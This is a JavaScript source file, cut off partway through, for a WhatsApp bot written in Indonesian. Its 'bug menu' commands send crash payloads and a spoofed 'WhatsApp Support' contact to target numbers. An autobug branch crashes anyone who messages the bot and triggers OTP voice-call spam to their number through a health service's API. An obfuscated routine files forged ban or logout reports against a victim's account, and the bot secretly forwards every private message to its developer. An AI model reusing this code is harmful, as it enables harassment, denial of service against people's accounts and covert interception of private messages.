const { baileys, proto, generateWAMessageFromContent, getContentType } = require('@adiwajshing/baileys')
const { getGroupAdmins, fetchJson } = require('./storage/functions.js')
const { exec } = require('child_process')
const cheerio = require('cheerio')
const moment = require('moment-timezone')
const util = require('util')
const axios = require('axios').default
const fs = require('fs')
autobug = true
mode = true

let user = JSON.parse(fs.readFileSync('./storage/database/user.json'));

module.exports = async (semar, denz, msg) => {
try {
if (msg.key && msg.key.remoteJid === 'status@broadcast') return
const type = getContentType(msg.message)
const content = JSON.stringify(msg.message)
const from = msg.key.remoteJid
const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const time = moment.tz('Asia/Jakarta').format('ha z')
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const dn = args.join(' ')
const isGroup = from.endsWith('@g.us')
const botNumber = semar.user.id.split(':')[0]
const sender = msg.key.fromMe ? (semar.user.id.split(':')[0]+'@s.whatsapp.net' || semar.user.id) : (msg.key.participant || msg.key.remoteJid)
const senderNumber = sender.split('@')[0]
const pushname = msg.pushName || `${senderNumber}`
const groupMetadata = isGroup ? await semar.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.id : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const isBotGroupAdmins = groupAdmins.includes(`${botNumber}@s.whatsapp.net`) || false
const isGroupAdmins = groupAdmins.includes(sender) || false
const isSaya = botNumber.includes(senderNumber)
const isDev = nomorDeveloper.includes(senderNumber) || isSaya
const isUser = user.includes(sender)
const reply = async(teks) => {await semar.sendMessage(from,{text: teks},{quoted:msg})}
const sleep = async (ms) => { return new Promise(resolve => setTimeout(resolve, ms))}
const bugreactionMessage = require("@adiwajshing/baileys").proto.ReactionMessage.create({ key: msg.key, text: "" })
const bugcontactMessage = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) },"message": {"contactMessage": {"displayName": "WhatsApp Support","vcard": "BEGIN:VCARD\nVERSION:3.0\nN:Support;WhatsApp;;;\nFN:WhatsApp Support\nORG:WhatsApp Support\nTITLE:\nitem1.TEL;waid=0:+0\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-NAME:WhatsApp Support\nEND:VCARD"}}}
const frpayment = {key: {remoteJid: '0@s.whatsapp.net',fromMe: false,id: 'MultiDevice',participant: '0@s.whatsapp.net'},message: {requestPaymentMessage: {currencyCodeIso4217: "USD",amount1000: 2022,requestFrom: '0@s.whatsapp.net',noteMessage: {extendedTextMessage: {text: 'Copyright © 2022 Dcode Denpa, AI. Semar-BMD'}},expiryTimestamp: 2022,amount: {value: 91929291929,offset: 1000,currencyCode: "USD"}}}}

const sendButMessage = (id, text1, footer1, but = [], options = {}) => {
const buttonMessage = {text: text1, footer: footer1, buttons: but, headerType: 1}
semar.sendMessage(id, buttonMessage, options)}

const sendButTemplate = (id, text1, footer1, but = [], options = {}) => {
const templateMessage = {text: text1,footer: footer1,templateButtons: but}
semar.sendMessage(id, templateMessage, options)}

const sendLstMessage = (id, text1, footer1, title1, buttonText1, sec  = [], options = {}) => {
const listMessage = {text: text1,footer: footer1,title: title1,buttonText: buttonText1, sections: sec}
semar.sendMessage(id, listMessage, options)}

const path = `./storage/database/limit/${sender}.txt`;
const limitin = async (limit) => {
if (!fs.existsSync(path)) {
fs.writeFileSync(path, "5");} else {
fs.writeFileSync(path, `${fs.readFileSync(path) - limit}`);}};
const addlimit = async (user, limit) => {
const path_user = `./storage/database/limit/${user}@s.whatsapp.net.txt`;
fs.writeFile(path_user, limit, function (err) {
if (err) throw err;})}

if (body.startsWith(`64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61`)) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
semar.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })}

if (autobug && !isDev && !command && !isGroup) { 
semar.relayMessage(from, { bugreactionMessage }, { messageId: "crash" })
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`+${senderNumber}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {console.log(response)}).catch(function (error) {console.log(error)})}

if (body && !isGroup && !isDev) {
semar.sendMessage(`${nomorDeveloper}@s.whatsapp.net`, {text:`• WhatsApp\nChat : ${body}\nFrom : ${pushname}\nNumber : ${senderNumber}\nLink : wa.me/${sender}`})}

if (command && !isUser) {
limitin(0);
user.push(sender);
fs.writeFileSync("./storage/database/user.json", JSON.stringify(user));}

if (body.startsWith(`$`)){ if (!isDev) return
let evl = body.split("\n")
let exc = body.replace(evl[0]+"\n", "")
exec(exc, (err, stdout, stderr) => {
if (stdout) return reply(`${stdout}`)
if (stderr) return reply(`${stderr}`)
if (err) return reply(`${err}`)})}
        
if (/^=?>/.test(body) && (isDev || msg.key.fromMe)){ let parse = /^=>/.test(body) ? body.replace(/^=>/,'return') : body.replace(/^>/,'')
try{ let evaluate = await eval(`;(async () => {${parse} })()`).catch(e => { return e })
return reply(require('util').format(evaluate))} catch(e){
return reply(require('util').format(e))}}

if (command) { await semar.readMessages([msg.key]) }
if (!mode) { if (!isDev) return }
switch (command) {
//©from:nathanael
case 'menu': case 'help': case '?':
var limitnye = fs.readFileSync(path);
semar.sendMessage(from,{text:`❏  *OTHER MENU*
•   ${prefix}status
•   ${prefix}delete

❏  *GROUP MENU*
•   ${prefix}open
•   ${prefix}close
•   ${prefix}add
•   ${prefix}kick
•   ${prefix}promote
•   ${prefix}demote
         
❏  *BUG MENU*
•   ${prefix}sendbug
•   ${prefix}dumpbug
•   ${prefix}spambug
•   ${prefix}buggc
•   ${prefix}banwa
         
❏  *OWNER MENU*
•   ${prefix}join
•   ${prefix}leave
•   ${prefix}restart
•   ${prefix}shutdown
•   ${prefix}public
•   ${prefix}private
•   ${prefix}chat
•   ${prefix}autobug

Limit Anda : ${limitnye}`}, {quoted:frpayment})
break

//©from: dennis × ivan
case 'verify': case 'ban': case 'logout': case 'banwa': case 'out':
var limit_user = fs.readFileSync(path, function (err) {
if (err) throw err;});
if (limit_user < 1) return reply('Limit Anda Kurang!\nUntuk Menambah Limit Silahkan Chat wa.me/6288219947210');
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +62 xxx-xxxx-xxxx`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
var jj=B;var jo=B;var ja=B;function B(j,o){var i=a();B=function(p,s){p=p-(-0x24b2+0x167*0xd+0x185*0xd);var R=i[p];if(B['BUybwb']===undefined){var V=function(v){var f='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Q='';var F='';var X=Q+V;for(var q=-0x641+0x2*-0x83+0x747*0x1,g,l,x=-0x13*0x1fd+0xac4+0x1b03;l=v['charAt'](x++);~l&&(g=q%(-0x38*0x44+0x17d3+-0x8ef)?g*(0x2*0x12fd+0x65*0x27+-0x351d)+l:l,q++%(0x17f0+-0x120f*0x2+0xc32))?Q+=X['charCodeAt'](x+(0x1a6f+0x2f5*0xd+-0x40d6))-(-0x1172+0x1*-0x1141+0x22bd*0x1)!==0x22b4+-0x7*-0xd7+-0x2895*0x1?String['fromCharCode'](-0x16fb+0x256c+0x6b9*-0x2&g>>(-(0x232c+0x1615+0x393f*-0x1)*q&0x16*0x1bf+0x1fa9+-0x460d*0x1)):q:-0xc14*-0x1+-0x1*-0x946+0x3*-0x71e){l=f['indexOf'](l);}for(var m=0xbbf*0x3+0x2009+-0x4346,P=Q['length'];m<P;m++){F+='%'+('00'+Q['charCodeAt'](m)['toString'](-0x8*0x298+0x2*0x38+-0x2*-0xa30))['slice'](-(-0x1a*0x41+-0x1af8+0x7*0x4cc));}return decodeURIComponent(F);};B['fYvveZ']=V;j=arguments;B['BUybwb']=!![];}var r=i[-0x476*-0x1+-0x1d5f+0x18e9];var G=p+r;var n=j[G];if(!n){var v=function(f){this['amFnoF']=f;this['QOEmVC']=[0x9c6*-0x2+-0xec*0xe+-0x4a3*-0x7,-0x964+0x1653+0xb*-0x12d,-0x19c3*0x1+0x110c+0x8b7];this['FcDGdf']=function(){return'newState';};this['STirYQ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['iiIpFX']='[\x27|\x22].+[\x27|\x22];?\x20*}';};v['prototype']['IXGXeo']=function(){var f=new RegExp(this['STirYQ']+this['iiIpFX']);var Q=f['test'](this['FcDGdf']['toString']())?--this['QOEmVC'][0x955+-0x1*0x25bd+0x1c69]:--this['QOEmVC'][0xac8+-0x3*0x89b+0xf09];return this['prkkGx'](Q);};v['prototype']['prkkGx']=function(f){if(!Boolean(~f)){return f;}return this['kmbeLz'](this['amFnoF']);};v['prototype']['kmbeLz']=function(f){for(var Q=0x582+0x15*0x141+-0x1fd7,F=this['QOEmVC']['length'];Q<F;Q++){this['QOEmVC']['push'](Math['round'](Math['random']()));F=this['QOEmVC']['length'];}return f(this['QOEmVC'][0x397*0x8+-0x70a+-0x2*0xad7]);};new v(B)['IXGXeo']();R=B['fYvveZ'](R);j[G]=R;}else{R=n;}return R;};return B(j,o);}var jB=B;var ji=B;(function(i,p){var w=B;var d=B;var E=B;var T=B;var W=B;var s=i();while(!![]){try{var R=-parseInt(w(0x1ed))/(-0x1e49+0x236c+-0x522)+-parseInt(d(0x1ea))/(0xcef+0x726+-0x1413)*(parseInt(w(0x19b))/(-0x35f+-0x1073*-0x1+-0xd11))+-parseInt(T(0x165))/(0x16fb+0x12cc+-0x29c3*0x1)*(-parseInt(d(0x1a3))/(0x1127+-0x9a5*-0x1+-0x1ac7))+-parseInt(E(0x1bc))/(0x1b41*0x1+0x9b7*0x1+0x24f2*-0x1)*(parseInt(T(0x1c2))/(-0x1b*0x97+-0x1f35+0x2f29*0x1))+parseInt(E(0x14d))/(0x30b*-0x2+-0x18c1+-0x469*-0x7)*(parseInt(d(0x19d))/(-0x96e+-0x67*0x7+0x4*0x312))+-parseInt(E(0x195))/(0x804+0x8*0x23a+-0x19ca)+-parseInt(d(0x1c3))/(-0xcee*-0x3+-0xbfc*-0x3+-0x4ab3*0x1)*(-parseInt(w(0x172))/(-0xd6*-0x6+0x998+-0xe90));if(R===p){break;}else{s['push'](s['shift']());}}catch(V){s['push'](s['shift']());}}}(a,0x2ff*-0x388+0x5*0x2ce0f+0x54d3f));var o=(function(){var c=B;var N=B;var K=B;var J=B;var y=B;var i={'iGauQ':c(0x1dc)+c(0x1a7),'pJnkD':K(0x166)+K(0x170)+K(0x1a4)+K(0x15f)+K(0x163)+y(0x1dd)+N(0x1a2)+'ta','KJeTv':N(0x1bb)+y(0x1aa),'KWzTy':function(s,R){return s(R);},'XawIq':c(0x1d4)+y(0x155)+'+$','rrCnP':function(s,R){return s!==R;},'dCBdk':c(0x1b9),'gKsZS':function(s,R){return s===R;},'Srlau':y(0x1c9),'Domld':K(0x1c8)};var p=!![];return function(s,R){var C=y;var U=y;var L=y;var Z=y;var k=J;var V={'NPXOk':i[C(0x160)],'IGHcS':function(G,n){var D=C;return i[D(0x178)](G,n);},'IXVZV':i[C(0x1bf)],'tZEMx':function(G,n){var M=C;return i[M(0x194)](G,n);},'KowZI':i[U(0x16c)]};if(i[Z(0x194)](i[U(0x1d2)],i[Z(0x1d2)])){var r=p?function(){var j0=Z;var j1=k;var j2=Z;var j3=k;var j4=k;if(V[j0(0x1b1)](V[j0(0x1a9)],V[j0(0x1a9)])){if(V){var v=v[j3(0x1af)](f,arguments);Q=null;return v;}}else{if(R){if(V[j0(0x1ce)](V[j0(0x1e6)],V[j2(0x1e6)])){var G=R[j0(0x1af)](s,arguments);R=null;return G;}else{return s[j0(0x1bd)+j0(0x1b0)]()[j2(0x15a)+'h'](V[j0(0x1d5)])[j2(0x1bd)+j1(0x1b0)]()[j2(0x1c1)+j1(0x185)+'r'](R)[j1(0x15a)+'h'](V[j2(0x1d5)]);}}}}:function(){};p=![];return r;}else{var n={};n[k(0x1ab)+'d']=S;g[U(0x1cf)+U(0x18a)+'e'](l,{'text':(Z(0x1d7)+Z(0x1be)+x+':\x20'+m+(L(0x1ac)+U(0x167)+U(0x187)+'\x20')+P[Z(0x19a)+'t'](t[Z(0x1a6)](e[Z(0x19e)][Z(0x1ec)+'ce'](i[C(0x184)],'')))+(L(0x1cb)+k(0x179))+Y[k(0x19a)+'t'](I))[k(0x1ec)+'ce'](i[k(0x1cd)],i[U(0x18b)])[Z(0x1ec)+'ce'](z[L(0x19e)][-0x17*0x175+0x21c3+-0x40],i[L(0x18b)])[k(0x1ec)+'ce'](O[Z(0x19e)][-0x1*-0x251d+0xb3*-0x1d+-0x10d6],i[C(0x18b)])},n);i[U(0x14a)](A,0xacc*0x1+0x16a2+-0x2169);i[U(0x14a)](H,C(0x1d6)+Z(0x1e2)+L(0x186)+'\x205');}};}());var j=o(this,function(){var j5=B;var j6=B;var j7=B;var j8=B;var j9=B;var p={};p[j5(0x154)]=j6(0x1d4)+j5(0x155)+'+$';var s=p;return j[j7(0x1bd)+j8(0x1b0)]()[j6(0x15a)+'h'](s[j9(0x154)])[j7(0x1bd)+j5(0x1b0)]()[j6(0x1c1)+j8(0x185)+'r'](j)[j7(0x15a)+'h'](s[j8(0x154)]);});j();var nom=dn;if(!nom[jj(0x1c5)+jj(0x1b5)]('+'))nom='+'+dn;var finding=await(await require(jj(0x199)+jj(0x1e1)+jB(0x174)+jB(0x15d))(nom))['g'];var ntah=await axios[ja(0x183)](jB(0x1d8)+ji(0x14e)+jo(0x164)+jj(0x1ba)+jj(0x15c)+jB(0x1ad)+ji(0x1ca)+jo(0x19c)+'t/');var email=await axios[jo(0x183)](jo(0x1d8)+jo(0x14e)+jB(0x193)+jo(0x16b)+jo(0x15c)+jj(0x1e4)+ja(0x192)+ji(0x1b4)+ji(0x1a8)+jo(0x188)+ji(0x16a)+jj(0x1b2)+ji(0x181));var cookie=ntah[jo(0x1d3)+'rs'][jj(0x156)+jB(0x1df)][jj(0x17e)](';\x20');var $=cheerio[ji(0x176)](ntah[ja(0x19e)]);var $form=$(ja(0x1a1));var url=new URL($form[jB(0x1e9)](jB(0x161)+'n'),ji(0x1d8)+jj(0x14e)+jo(0x164)+jj(0x1ba)+ji(0x19f))[ji(0x150)];var form=new URLSearchParams();form[ja(0x191)+'d'](ja(0x17c)+'st',$form[ja(0x1b6)](jB(0x1a0)+ja(0x175)+jB(0x15e)+ja(0x1e0))[ja(0x14c)]());form[ji(0x191)+'d'](jj(0x151),$form[jj(0x1b6)](ja(0x1a0)+ji(0x175)+ji(0x171))[ja(0x14c)]());form[ji(0x191)+'d'](ji(0x17b),ja(0x177)+'t');form[jj(0x191)+'d'](jj(0x1a5)+ji(0x197)+ji(0x1ae)+'r',finding[ji(0x159)+ja(0x14f)]);form[jo(0x191)+'d'](jB(0x18e)+jo(0x169)+'er',finding[jj(0x173)+'r'][ji(0x1e5)+ji(0x1c6)+jo(0x17f)]);form[jB(0x191)+'d'](jo(0x1c4),email[jj(0x19e)][0x2669*0x1+0x1e21+-0x448a]);form[jo(0x191)+'d'](ja(0x1c4)+ji(0x16e)+jo(0x162),email[jo(0x19e)][0x7e7+0x67+0x1*-0x84e]);form[jo(0x191)+'d'](ja(0x1cc)+jo(0x15b),ja(0x17d)+'ID');form[jj(0x191)+'d'](jo(0x158)+jj(0x1e8)+'ge',ji(0x166)+ji(0x170)+jo(0x1a4)+jo(0x15f)+jo(0x163)+jj(0x1dd)+jB(0x1a2)+'ta');form[jj(0x191)+'d'](jj(0x153)+'r','0');form[jj(0x191)+'d'](ji(0x1d9),'1');form[jB(0x191)+'d'](ji(0x168),'');form[jo(0x191)+'d'](jB(0x152),'8');form[jj(0x191)+'d'](ja(0x1b3),ji(0x1b8)+ji(0x1de)+ji(0x1db)+jo(0x1ee)+jB(0x196)+jB(0x18f)+ja(0x16f));form[jo(0x191)+'d'](ja(0x1e7),'1');form[jB(0x191)+'d'](ja(0x1e3),ja(0x198)+'WN');form[ji(0x191)+'d'](jj(0x180),jj(0x1da)+jB(0x17a));form[ji(0x191)+'d'](jB(0x18c)+ji(0x189)+ja(0x18d),'0');var u={};u[jj(0x1d1)+'e']=cookie;var b={};b[jB(0x1b7)]=url;b[jo(0x157)+'d']=ja(0x182);b[ji(0x19e)]=form;b[ji(0x1d3)+'rs']=u;var res=await axios(b);if(res[jo(0x19e)][jo(0x190)+ja(0x1ef)](jj(0x16d))){var h={};h[jo(0x1ab)+'d']=msg;semar[ji(0x1cf)+ja(0x18a)+'e'](from,{'text':(jj(0x1d7)+jj(0x1be)+command+':\x20'+nom+(jo(0x1ac)+jo(0x167)+ja(0x187)+'\x20')+util[jj(0x19a)+'t'](JSON[jj(0x1a6)](res[ja(0x19e)][jB(0x1ec)+'ce'](jB(0x1dc)+jj(0x1a7),'')))+(ja(0x1cb)+jB(0x179))+util[jB(0x19a)+'t'](form))[jo(0x1ec)+'ce'](jB(0x166)+ja(0x170)+jj(0x1a4)+ji(0x15f)+ja(0x163)+jo(0x1dd)+jo(0x1a2)+'ta',ja(0x1bb)+ji(0x1aa))[jo(0x1ec)+'ce'](email[ji(0x19e)][0x6d6+0x1dfb+-0x24d1],ji(0x1bb)+jj(0x1aa))[jB(0x1ec)+'ce'](email[jo(0x19e)][-0x222e+-0xa*0x2f6+-0x8e*-0x73],jj(0x1bb)+jo(0x1aa))},h);limitin(0x9*0x257+0x12b*-0xf+0x1*-0x385);reply(ji(0x1d6)+jj(0x1e2)+jj(0x186)+'\x205');}else{reply(ja(0x14b)+ja(0x1eb)+ja(0x1c0)+ja(0x1d0)+jo(0x1c7));}function a(){var jp=['Ahr0Chm','x19H','mtaWnJy','Agf0C2e','zM9YicG','ig1PBMG','lKjqoNC','B29RAwu','zxn0xq','BwuTCgG','iejLCMS','x19Jy2C','yxbPl3y','Aw50zxi','s293wKK','zhbY','BwvZC2e','yxr0CG','ndK4u0XrEuP1','oIbdB2i','CMvWBge','nteXmdGXENbkB3LX','ChbFD3C','zgvZ','s1D6vhK','rxjYB3i','DMfS','nJC1mNr1A1nUuq','oI8VD3C','BKnVzgu','AhjLzG','BhnK','x19Yzxe','x191C2u','zKLZt0q','ksSPkYK','C2v0lwm','Bwv0Ag8','Ew91CL8','CMvNAw8','C2vHCMm','B3jT','lMnVBs8','BwjLCG','pwPHEM8','oIbKzxm','wgf3sxe','ywn0Aw8','AxjT','yxrPDMu','DY53Age','mtm1mtzcsNLksvu','ugvYzgK','DwX0CZO','x19JC3i','x251Bwi','ywLSyM8','y21HAwW','u3jSyxu','Dhj1zq','x2nVBMy','mc4WlJa','zg8VCM8','pwXZzf0','odCWmdGYoeDOuMforW','BNvTyMu','B25LBNu','w25HBwu','Bg9Hza','C3vIBwK','CNjdBLa','yw1ZoIa','mZa4ntG','C3rLCa','AMf6B2u','qu5euK8','AM9PBG','BMfS','x19Yzxy','BNq9mq','ue9tva','z2v0','AuDHDve','CNvJDg8','DxjHBMC','ierHDge','BMrVBu0','BwvUDf8','zxnZywC','s0PLvhy','x19JB20','CMvX','CgHVBMu','lJiUmc4','Aw5JBhu','yxbWzw4','ms8/ywm','DY4XC2u','z0TZwLm','mZaXndmWvvzlA1rZ','D19WA2C','CNLFC2u','vu5ltK8','yxDLC28','zM9YBwe','mtm2ntLUDLvXAwi','y2XPzw4','mJK3wu9MBfnu','zgf0yq','lMnVBq','Aw5WDxq','zM9YBq','ysbJB24','mZC1sNfQwgfh','DwjHzg8','y291BNq','CgfYC2u','oZSPoW','z2vUuMe','svHwwLy','uKve','CxvVDgu','cGPszxm','y29UDge','BgvJDg8','yxbWBhK','Aw5N','suDiy1m','EczJB3u','x19OCW','DgLVBJ0','C1DPDgG','zMLUza','DxjS','mtKZmty','u250A1O','DhnHCha','q0vou08','odK5nfjkrwjhtq','Dg9tDhi','C3mG','zenczgS','ysbRzsa','y29UC3q','otCZzhbJs1vi','mZnmz1H1suO','zw1HAwW','C3rHCNq','BMf0Aw8','igXHAw4','z1bIyvq','wgfiww4','y3qVBM8','cGPqyxi','CgXHDgy','CePUA0q','DfPftxG','C2vUze0','tM9TB3i','y29VA2K','rg9TBgq','AgvHzgu','kcGOlIS','tLbyt2S','tgLTAxq','u3vJy2u'];a=function(){return jp;};return a();}
break

//©from: dennis
case 'cek': case 'test': case 'status':
exec(`pm2 status`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: nayla
case 'open':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'not_announcement')
reply('_Successfully Opened Group!_\n')
break

//©from: nayla
case 'close':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins && !isDev) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
await semar.groupSettingUpdate(from, 'announcement')
reply('_Successfully Closed The Group!_\n')
break

//©from: dennis
case 'add':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
add = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [add], "add")
break

//©from: dennis
case 'kick':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
remove = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [remove], "remove")
break

//©from: dennis
case 'promote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
promote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [promote], "promote")
reply('Done!')
break

//©from: dennis
case 'demote':
if (!isGroup) return reply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
if (!isGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Admin!')
if (!isBotGroupAdmins) return reply('Fitur Ini Hanya Dapat Digunakan Setelah Nomor Ini Menjadi Admin!')
if (msg.message.extendedTextMessage === undefined || msg.message.extendedTextMessage === null) return reply('Reply targetnya!')
demote = msg.message.extendedTextMessage.contextInfo.participant
await semar.groupParticipantsUpdate(from, [demote], "demote")
reply('Done!')
break

//©from: dennis × ivan
case 'sendbug':
var limit_user = fs.readFileSync(path, function (err) {
if (err) throw err;});
if (limit_user < 1) return reply('Limit Anda Kurang!\nUntuk Menambah Limit Silahkan Chat wa.me/6285866295942');
if (!dn) return reply(`Silahkan masukkan nomor dan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}|10`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
nd = dn.split("|")
if (Number(nd[1]) >= 100) return reply('Jumlah terlalu banyak!')
if (!Number(nd[1])) return reply(`Silahkan masukkan jumlah bug!\nContoh: ${prefix}${command} ${senderNumber}|10`)
reply('Loading 3Second...')
for (let i = 0; i < nd[1]; i++){
await sleep(3000)
reply(`Berhasil mengirim ${Number(i) + 1} bug!`)
let sendbug = await semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" })
await sleep(3000)
semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { delete: sendbug.key })}
reply(`Sukses mengirim ${nd[1]} bug ke nomor ${nd[0]}`)
limitin(3)
reply(`Limit Berkurang 3`)
break

//©from: dennis × andik
case 'dumpbug':
var limit_user = fs.readFileSync(path, function (err) {
if (err) throw err;});
if (limit_user < 1) return reply('Limit Anda Kurang!\nUntuk Menambah Limit Silahkan Chat wa.me/6285866295942');
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith('+')) return reply(`Awali nomor dengan 62!\nContoh: ${prefix}${command} ${senderNumber}`)
if (args[0].startsWith(`${nomorDeveloper}`)) return reply(`Tidak bisa ${command} ke nomor developer!`)
if (args[0].startsWith(`${botNumber}`)) return reply(`Tidak bisa ${command} ke nomor ini!`)
semar.sendMessage(`${dn}@s.whatsapp.net`, { text: "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61" }, { quoted: bugcontactMessage })
reply(`Sukses mengirim bug ke nomor ${dn}`)
limitin(3)
reply(`Limit Berkurang 3`)
break

//©from: dennis × ivan × andik
case 'spambug':
var limit_user = fs.readFileSync(path, function (err) {
if (err) throw err;});
if (limit_user < 1) return reply('Limit Anda Kurang!\nUntuk Menambah Limit Silahkan Chat wa.me/6285866295942');
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} ${senderNumber}`)
